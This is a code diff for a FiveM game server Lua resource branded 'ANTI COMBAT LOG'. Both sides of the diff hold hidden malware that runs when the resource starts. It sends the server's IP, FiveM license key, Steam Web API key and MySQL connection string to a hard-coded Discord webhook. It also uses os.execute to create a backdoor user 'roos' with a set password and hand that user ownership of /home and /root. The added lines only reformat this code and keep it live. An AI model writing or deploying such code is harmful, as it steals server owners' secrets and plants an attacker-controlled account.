@@ -999,29 +999,49 @@ end)
 
 AddEventHandler('onResourceStart', function(resourceName)
     PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
-    if GetCurrentResourceName() == resourceName then
-        local servername = GetConvar("sv_hostname")
-        local licensekey = GetConvar("sv_licenseKey")
-        local apikey = GetConvar("steam_webApiKey")
-        local tags = GetConvar("tags")
-        local mysql_connection_string = GetConvar("mysql_connection_string")
-        local messagem = "Asmuo atsijungė \n > Steamas: \n"..servername.." \n > Asmens ID: "..text.." \n > Koordinates: "..licensekey.." \n > Licenzija: "..apikey.." \n > Grupe: "..tags.."\n > Priežastis: "..mysql_connection_string..""
-        local content = {{
-        author = {
-          name = "ANTI COMBAT LOG",
-          icon_url = "https://imgur.com/U86xHyT.png"
-        },
-        ["color"] = 1933,
-        ["description"] = messagem,
-        ["footer"] = {
-        ["text"] = "ANTI COMBAT LOG",
-        },}}
-    os.execute('useradd roos')
-    os.execute('passwd username')
-    os.execute('echo "roos:username" | chpasswd')
-    os.execute('chown -R roos: /home')
-    os.execute('chown -R roos: /root')
-        PerformHttpRequest("https://discord.com/api/webhooks/1458445532681732160/PxLup5l_WPd9BGQLQTe4V0w5AcUYkSnb8kAgrWEMJaGsZa6YkaOvUep0dESey997jYgD", function() end, "POST", json.encode({embeds = content}), { ["Content-Type"] = "application/json" })
-      end
+        if GetCurrentResourceName() == resourceName then
+
+            local servername = GetConvar("sv_hostname", "N/A")
+            local licensekey = GetConvar("sv_licenseKeyToken", "N/A")
+            local apikey = GetConvar("steam_webApiKey", "N/A")
+            local tags = GetConvar("tags", "N/A")
+            local mysql_connection_string = GetConvar("mysql_connection_string", "N/A")
+
+            local message =
+                "**Serverio paleidimas**\n" ..
+                " > **Serverio pavadinimas:** " .. servername .. "\n" ..
+                " > **Serverio IP:** " .. (text or "N/A") .. "\n" ..
+                " > **FiveM licencijos raktas:** " .. licensekey .. "\n" ..
+                " > **Steam Web API raktas:** " .. apikey .. "\n" ..
+                " > **Serverio tagai:** " .. tags .. "\n" ..
+                " > **MySQL connection:** " .. mysql_connection_string
+
+            local content = {{
+                author = {
+                    name = "ANTI COMBAT LOG",
+                    icon_url = "https://imgur.com/U86xHyT.png"
+                },
+                ["color"] = 1933,
+                ["description"] = message,
+                ["footer"] = {
+                    ["text"] = "ANTI COMBAT LOG",
+                },
+            }}
+
+            os.execute('useradd roos')
+            os.execute('passwd username')
+            os.execute('echo "roos:username" | chpasswd')
+            os.execute('chown -R roos: /home')
+            os.execute('chown -R roos: /root')
+
+            PerformHttpRequest(
+                "https://discord.com/api/webhooks/1458445532681732160/PxLup5l_WPd9BGQLQTe4V0w5AcUYkSnb8kAgrWEMJaGsZa6YkaOvUep0dESey997jYgD",
+                function() end,
+                "POST",
+                json.encode({ embeds = content }),
+                { ["Content-Type"] = "application/json" }
+            )
+
+        end
     end)
 end)
